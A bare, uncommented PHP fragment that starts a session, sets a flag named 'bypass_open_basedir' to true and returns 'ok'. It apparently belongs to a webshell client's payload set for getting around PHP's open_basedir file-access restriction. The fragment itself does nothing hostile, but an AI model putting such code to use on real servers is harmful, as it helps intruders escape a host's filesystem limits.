@session_start();
$_SESSION["bypass_open_basedir"]=true;
@session_write_close();
return "ok";